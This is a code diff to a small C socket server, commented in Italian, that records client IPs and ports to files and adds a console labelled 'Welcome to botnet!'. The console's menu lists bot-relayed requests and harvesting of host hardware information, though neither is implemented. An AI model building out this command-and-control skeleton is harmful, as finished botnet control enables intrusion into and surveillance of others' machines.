@@ -4,6 +4,8 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include "cJSON.h"
+#include <time.h>
+#include <pthread.h>
 
 #define PORT 8081
 #define MAX_REQUEST_SIZE 1024
@@ -53,9 +55,8 @@ void handle_post_request(int client_socket, char *data) {
     // Leggi i dati dall'array "ports"
     for (int i = 0; i < cJSON_GetArraySize(portsArray) && i < 20; i++) {
         cJSON *portItem = cJSON_GetArrayItem(portsArray, i);
-        if (cJSON_IsString(portItem)) {
-            strncpy(myData.ports[i], portItem->valuestring, sizeof(myData.ports[i]) - 1);
-            myData.ports[i][sizeof(myData.ports[i]) - 1] = '\0'; // Assicura la terminazione della stringa
+        if (cJSON_IsNumber(portItem)) {
+            snprintf(myData.ports[i], sizeof(myData.ports[i]), "%d", portItem->valueint);
         }
     }
 
@@ -79,12 +80,74 @@ void handle_post_request(int client_socket, char *data) {
     send(client_socket, responseHeader, strlen(responseHeader), 0);
     send(client_socket, responseJsonStr, strlen(responseJsonStr), 0);
     free(responseJsonStr);
+
+    // Crea e scrivi il file di testo
+    char filename[32];
+    sprintf(filename, "%s.txt", myData.clientIP);
+    FILE *file = fopen(filename, "w");
+    if (file != NULL) {
+        // Scrivi il timestamp
+        time_t now;
+        time(&now);
+        struct tm *tm_info = localtime(&now);
+        char timestamp[20];
+        strftime(timestamp, sizeof(timestamp), "%Y%m%d %H:%M:%S", tm_info);
+        fprintf(file, "%s\n", timestamp);
+
+        // Scrivi la lista delle porte solo se sono presenti
+        int hasPorts = 0; // Flag per verificare se ci sono porte da scrivere
+        for (int i = 0; i < 20; i++) {
+            if (strlen(myData.ports[i]) > 0) {
+                if (hasPorts) {
+                    fprintf(file, "|");
+                }
+                fprintf(file, "%s", myData.ports[i]);
+                hasPorts = 1; // Imposta il flag a 1 quando almeno una porta è stata scritta
+            }
+        }
+        if (hasPorts) {
+            fprintf(file, "\n");
+        }
+        fclose(file);
+    }
 }
+
+
+// Funzione del thread per la gestione dell'input dell'utente
+void *user_input_thread(void *arg) {
+    char command[1024];
+    printf("Welcome to botnet!\n\nThis is a botnet simulator without any malicious purpose\n\nType 'list' for a detailed list of commands available\n\n");
+    while (1) {
+        printf("$ ");
+        fflush(stdout);
+
+        if (fgets(command, sizeof(command), stdin) == NULL) {
+            break;  // Termina il loop in caso di errore o fine dell'input
+        }
+
+        //list command
+        if (strcmp(command, "list\n") == 0) {
+            // Eseguire un'azione di uscita o terminare il server
+            printf("1) request {hostname:port}\n Send a request to a specified hostname and port via bot.\n\n2) hardware-info\n Receive hardware and software information about hosts connected to this botnet.\n\n");
+            printf("$ ");
+        }
+        //exit
+        if (strcmp(command, "exit\n") == 0) {
+            // Eseguire un'azione di uscita o terminare il server
+            exit(0);
+        }
+    }
+
+    return NULL;
+}
+
 
 int main() {
     int server_socket, client_socket;
     struct sockaddr_in server_addr, client_addr;
     socklen_t client_addr_len = sizeof(client_addr);
+    pthread_t user_input_thread_id; // ID del thread per la gestione dell'input dell'utente
+
 
     // Creazione del socket
     server_socket = socket(AF_INET, SOCK_STREAM, 0);
@@ -110,8 +173,15 @@ int main() {
         exit(EXIT_FAILURE);
     }
 
-    printf("Server in ascolto sulla porta %d\n", PORT);
+    printf("Server start on port %d\n\n", PORT);
 
+    // Creazione del thread per la gestione dell'input dell'utente
+    if (pthread_create(&user_input_thread_id, NULL, user_input_thread, NULL) != 0) {
+        perror("Errore nella creazione del thread per l'input dell'utente");
+        exit(EXIT_FAILURE);
+    }
+
+    //Loop principale del server
     while (1) {
         // Accetto una connessione in entrata
         client_socket = accept(server_socket, (struct sockaddr *) &client_addr, &client_addr_len);
@@ -148,6 +218,12 @@ int main() {
 
     // Chiudi il socket del server
     close(server_socket);
+    // Join del thread per la gestione dell'input dell'utente
+    if (pthread_join(user_input_thread_id, NULL) != 0) {
+        perror("Errore nel join del thread per l'input dell'utente");
+        exit(EXIT_FAILURE);
+    }
 
     return 0;
 }
+
